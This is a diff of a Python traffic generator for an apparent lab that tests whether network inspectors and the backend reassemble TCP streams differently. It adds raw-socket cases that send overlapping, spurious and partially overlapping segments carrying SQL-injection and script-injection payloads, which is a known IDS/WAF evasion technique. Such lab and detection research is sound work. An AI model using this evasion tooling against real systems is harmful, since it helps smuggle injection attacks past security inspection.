@@ -1,168 +1,247 @@
 #!/usr/bin/env python3
 """
-TRS Traffic Generator (Phase 1)
+TRS Traffic Generator
 
-Capabilities:
-- Baseline: normal delivery, no loss
-- Loss-induced retransmission (real kernel retransmits of identical data)
-- (Future) Raw socket spurious retransmit / overlapping segments with different content
+Phase 1 cases (kernel-driven, real retransmits):
+  baseline    Normal delivery, no impairments. Sanity check.
+  loss        Sends via kernel; expects impair-{left,right} loss to be set on
+              the middle so kernel retransmits trigger. Identical payload on
+              wire and in app — useful to verify TCP_REXMIT logging only.
 
-Uses only stdlib + subprocess for tc/iptables (as required).
+Phase 2 cases (raw-socket, controlled segments — the actual TRS primitives):
+  overlap     Sends benign segment at seq=X, then an OVERLAPPING segment at
+              seq=X with different (malicious) content. Inspector and backend
+              may pick different bytes during reassembly.
+  spurious    Sends payload normally, waits for ACK, then sends a duplicate
+              segment with same seq+content (spurious retransmit). Tests
+              whether inspector re-inspects already-ACKed duplicates.
+  partial    Sends segment at seq=X with benign content, then a partial-
+              overlap segment at seq=X+offset with different bytes spanning
+              into the unsent range.
 
-Run inside the attacker container (or with proper caps + routes).
+Network placement assumption: impairments live on the *middle* container
+(see /usr/local/bin/impair-{left,right} there). This generator does NOT
+touch tc / iptables on its own networking — except to install the kernel-RST
+suppression rule required by RawTcpSession (auto-managed).
+
+Run inside the attacker container. Requires NET_RAW + NET_ADMIN caps.
 """
+
+from __future__ import annotations
 
 import argparse
 import socket
-import subprocess
 import sys
 import time
 from datetime import datetime, timezone
 
+# Allow `python /app/generator.py` to find raw_tcp in the same dir
+sys.path.insert(0, "/app")
+from raw_tcp import RawTcpSession  # noqa: E402
+
 
 TARGET_DEFAULT = "10.20.0.2:8080"
-IFACE_DEFAULT = "eth0"          # inside the attacker container
 
 
-def log(msg: str):
+def log(msg: str) -> None:
     ts = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
     print(f"[{ts}] [generator] {msg}", flush=True)
 
 
-def run(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess:
-    """Run a shell command and log it."""
-    log(f"$ {' '.join(cmd)}")
-    return subprocess.run(cmd, capture_output=True, text=True, check=check)
+# === Payloads ===
+
+def http_payload(path: str = "/api/v1/user?id=1", extra: bytes = b"") -> bytes:
+    body = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: trs-lab.local\r\n"
+        f"User-Agent: TRS-Generator/1.0\r\n"
+        f"Accept: */*\r\n"
+    ).encode("ascii")
+    return body + extra + b"Content-Length: 0\r\n\r\n"
 
 
-def setup_loss(iface: str, loss_pct: float, delay_ms: int = 0):
-    """Add netem qdisc for loss (and optional delay) on egress."""
-    # Remove any existing qdisc first
-    run(["tc", "qdisc", "del", "dev", iface, "root"], check=False)
-    cmd = ["tc", "qdisc", "add", "dev", iface, "root", "netem"]
-    if loss_pct > 0:
-        cmd += ["loss", f"{loss_pct}%"]
-    if delay_ms > 0:
-        cmd += ["delay", f"{delay_ms}ms"]
-    run(cmd)
+BENIGN = http_payload("/api/v1/user?id=1")
+# Same length as BENIGN within the first overlap window — used as the "evil"
+# overlap content. Length match is not required but keeps seq math obvious.
+EVIL_OVERLAP = http_payload(
+    "/api/v1/user?id=1'+OR+'1'='1",
+    extra=b"X-Inject: <script>alert(1)</script>\r\n",
+)
 
 
-def cleanup_qdisc(iface: str):
-    run(["tc", "qdisc", "del", "dev", iface, "root"], check=False)
+# === Case implementations ===
 
-
-def send_payload(target: str, payload: bytes, nodelay: bool = True, send_delay: float = 0.0) -> int:
-    """
-    Establish TCP connection, send payload (optionally in pieces), return bytes sent.
-    """
-    host, port = target.split(":")
-    port = int(port)
-
-    log(f"Connecting to {host}:{port} ...")
-    with socket.create_connection((host, port), timeout=30) as s:
-        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1 if nodelay else 0)
-
-        total = 0
-        # For demo we can split into multiple segments if desired by caller
-        # Here we send the whole thing in one call (kernel may still segment)
-        # To force more segments, the caller can loop with small writes + time.sleep
-        if send_delay > 0:
-            # Example: send in two parts with a gap to create distinct segments
-            mid = len(payload) // 2 or 1
-            s.sendall(payload[:mid])
-            total += mid
-            time.sleep(send_delay)
-            s.sendall(payload[mid:])
-            total += len(payload) - mid
-        else:
-            s.sendall(payload)
-            total = len(payload)
-
-        log(f"Sent {total} bytes. Waiting for remote close / timeout...")
-        # We don't care about the reply for this lab (one-way data test)
-        # Just drain or wait a bit so the last segment has time to be ACKed
+def case_baseline(target_ip: str, target_port: int) -> None:
+    """Kernel TCP, normal delivery. The reference case."""
+    log("baseline: kernel TCP, no impairments expected")
+    with socket.create_connection((target_ip, target_port), timeout=10) as s:
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.sendall(BENIGN)
         s.settimeout(2.0)
         try:
             while s.recv(4096):
                 pass
         except socket.timeout:
             pass
-
-    log("Connection closed from our side.")
-    return total
+    log(f"baseline: sent {len(BENIGN)} bytes via kernel")
 
 
-def build_test_payload(case: str) -> bytes:
-    """Return interesting payloads for different test cases."""
-    if case == "baseline" or case == "loss":
-        # Simple HTTP-like request that a WAF might inspect
-        return (
-            b"GET /api/v1/user?id=1' OR '1'='1 HTTP/1.1\r\n"
-            b"Host: trs-lab.local\r\n"
-            b"User-Agent: TRS-Generator/1.0\r\n"
-            b"Accept: */*\r\n"
-            b"X-Custom: <script>alert(1)</script>\r\n"
-            b"Content-Length: 0\r\n"
-            b"\r\n"
-        )
-    if case == "overlap":
-        # Will be used in raw-injection phase
-        return b"OVERLAP_TEST_" + b"A" * 200 + b"B" * 200
-    return b"TRS-TEST-PAYLOAD-" + b"X" * 512
+def case_loss(target_ip: str, target_port: int) -> None:
+    """
+    Kernel TCP. Caller is expected to have set up impairment on the middle
+    BEFORE running this case, e.g.:
+        docker compose exec middle impair-right loss 8 10
+    Triggers real kernel retransmits with identical payloads.
+    """
+    log("loss: kernel TCP — set impair-right on middle first for retransmits")
+    case_baseline(target_ip, target_port)
 
 
-def main():
-    parser = argparse.ArgumentParser(description="TRS Lab Traffic Generator")
-    parser.add_argument("--target", default=TARGET_DEFAULT,
-                        help="host:port of the backend (default: 10.20.0.2:8080)")
-    parser.add_argument("--iface", default=IFACE_DEFAULT,
-                        help="network interface for tc netem (default: eth0)")
-    parser.add_argument("--case", choices=["baseline", "loss", "overlap", "spurious"],
-                        default="baseline", help="Test scenario to run")
-    parser.add_argument("--loss", type=float, default=8.0,
-                        help="Packet loss %% for 'loss' case (default 8%%)")
-    parser.add_argument("--delay", type=int, default=5,
-                        help="Extra delay (ms) for netem in loss case")
-    parser.add_argument("--count", type=int, default=1,
-                        help="How many connections / iterations to perform")
-    parser.add_argument("--send-delay", type=float, default=0.05,
-                        help="Delay (seconds) between partial sends to encourage distinct segments")
+def case_overlap(target_ip: str, target_port: int, delay: float = 0.0) -> None:
+    """
+    The TRS overlap primitive.
 
-    args = parser.parse_args()
+    Sends:
+      1. Benign segment at seq=X  (BENIGN payload)
+      2. Overlapping segment at seq=X with different content (EVIL_OVERLAP)
 
-    log(f"TRS Generator starting - case={args.case} target={args.target}")
+    Both segments cover the same seq range. The backend's TCP stack will keep
+    the first one accepted; the inspector's reassembler may behave differently.
+    Compare Zeek TCP_CONTENTS vs backend APPLICATION VIEW with analyze.py.
+    """
+    log("overlap: raw-socket — benign then overlapping evil at same seq")
+    with RawTcpSession(target_ip, target_port) as s:
+        log(f"  src_port={s.src_port} iss={s.iss:#x}")
+        s.open(timeout=5.0)
+        log("  handshake OK")
 
-    payload = build_test_payload(args.case)
-    log(f"Payload length: {len(payload)} bytes")
+        # Send benign data; record the seq
+        seq_used = s.send_data(BENIGN)
+        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")
 
+        if delay > 0:
+            time.sleep(delay)
+
+        # Overlap: same seq, different content (truncated/padded to match length)
+        evil = EVIL_OVERLAP
+        if len(evil) > len(BENIGN):
+            evil = evil[: len(BENIGN)]
+        elif len(evil) < len(BENIGN):
+            evil = evil + b"A" * (len(BENIGN) - len(evil))
+        s.inject_at(seq_used, evil)
+        log(f"  injected OVERLAP ({len(evil)} bytes) at same seq={seq_used}")
+
+        # Let peer ACK / FIN if it wants to
+        s.drain(duration=0.5)
+        s.close(timeout=2.0)
+    log("overlap: done")
+
+
+def case_spurious(target_ip: str, target_port: int, count: int = 1, delay: float = 0.2) -> None:
+    """
+    Spurious retransmit primitive.
+
+    Sends payload, lets it be ACKed by the backend, then re-sends the same
+    segment (same seq, same content) `count` extra times. Tests whether the
+    inspector re-inspects already-ACKed duplicates differently.
+    """
+    log(f"spurious: raw-socket — payload + {count} spurious dup(s)")
+    with RawTcpSession(target_ip, target_port) as s:
+        log(f"  src_port={s.src_port}")
+        s.open(timeout=5.0)
+
+        seq_used = s.send_data(BENIGN)
+        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")
+        time.sleep(delay)
+        s.drain(duration=0.2)
+
+        for i in range(count):
+            time.sleep(delay)
+            s.inject_at(seq_used, BENIGN)
+            log(f"  spurious dup #{i+1} at seq={seq_used}")
+
+        s.drain(duration=0.5)
+        s.close(timeout=2.0)
+    log("spurious: done")
+
+
+def case_partial(target_ip: str, target_port: int, offset: int = 8) -> None:
+    """
+    Partial-overlap primitive.
+
+    Sends segment A: BENIGN at seq=X.
+    Sends segment B at seq=X+offset with bytes that overwrite part of A
+    AND extend beyond A's end. This is the classic Ptacek/Newsham overlap
+    evasion shape adapted for TCP retransmits.
+    """
+    log(f"partial: raw-socket — segment + partial overlap at +{offset}")
+    with RawTcpSession(target_ip, target_port) as s:
+        s.open(timeout=5.0)
+
+        seq_used = s.send_data(BENIGN)
+        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")
+
+        evil_tail = b"\xff' OR 1=1 -- " + b"Z" * 20
+        s.inject_at(seq_used + offset, evil_tail)
+        log(f"  injected partial overlap ({len(evil_tail)} bytes) at seq={seq_used + offset}")
+
+        s.drain(duration=0.5)
+        s.close(timeout=2.0)
+    log("partial: done")
+
+
+# === CLI ===
+
+CASES = {
+    "baseline": case_baseline,
+    "loss": case_loss,
+    "overlap": case_overlap,
+    "spurious": case_spurious,
+    "partial": case_partial,
+}
+
+
+def main() -> int:
+    p = argparse.ArgumentParser(description="TRS Lab Traffic Generator")
+    p.add_argument("--target", default=TARGET_DEFAULT, help="host:port (default: %(default)s)")
+    p.add_argument("--case", choices=list(CASES), default="baseline")
+    p.add_argument("--count", type=int, default=1, help="How many iterations")
+    p.add_argument("--gap", type=float, default=1.0, help="Seconds between iterations")
+    p.add_argument("--overlap-delay", type=float, default=0.0,
+                   help="Seconds between original and overlap segment (overlap case)")
+    p.add_argument("--spurious-count", type=int, default=2,
+                   help="How many spurious duplicates to send (spurious case)")
+    p.add_argument("--partial-offset", type=int, default=8,
+                   help="Byte offset of the partial overlap (partial case)")
+
+    args = p.parse_args()
+
+    host, port_s = args.target.split(":")
+    port = int(port_s)
+
+    log(f"Starting: case={args.case} target={host}:{port} count={args.count}")
+
+    handler = CASES[args.case]
     for i in range(args.count):
-        log(f"=== Run {i+1}/{args.count} ===")
-
-        if args.case == "loss":
-            log(f"Applying netem loss={args.loss}% delay={args.delay}ms on {args.iface}")
-            setup_loss(args.iface, args.loss, args.delay)
-            # Give qdisc a moment
-            time.sleep(0.2)
-
+        log(f"=== Iteration {i + 1}/{args.count} ===")
         try:
-            sent = send_payload(
-                args.target,
-                payload,
-                nodelay=True,
-                send_delay=args.send_delay if args.case in ("loss", "baseline") else 0.0,
-            )
-            log(f"Run {i+1} completed, sent={sent} bytes")
-        finally:
-            if args.case == "loss":
-                log("Cleaning up netem qdisc")
-                cleanup_qdisc(args.iface)
-                time.sleep(0.3)
-
+            if args.case == "overlap":
+                handler(host, port, delay=args.overlap_delay)
+            elif args.case == "spurious":
+                handler(host, port, count=args.spurious_count)
+            elif args.case == "partial":
+                handler(host, port, offset=args.partial_offset)
+            else:
+                handler(host, port)
+        except Exception as exc:
+            log(f"ERROR in iteration {i + 1}: {exc!r}")
+            return 1
         if i < args.count - 1:
-            time.sleep(1.0)
+            time.sleep(args.gap)
 
-    log("All runs finished. Check /pcaps/ on the middle container and backend logs.")
+    log("All iterations complete. Check pcaps + backend logs.")
+    return 0
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
